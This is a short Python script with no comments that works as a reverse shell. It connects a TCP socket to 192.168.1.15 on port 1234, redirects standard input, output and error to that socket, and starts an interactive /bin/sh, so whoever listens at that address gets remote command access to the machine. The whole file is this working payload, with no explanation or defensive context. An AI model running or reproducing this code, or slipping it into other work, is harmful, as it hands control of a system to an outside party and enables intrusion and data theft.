#! /usr/bin/python3.S

import socket,subprocess,os

s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('192.168.1.15', 1234))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
p=subprocess.call(['/bin/sh', '-i'])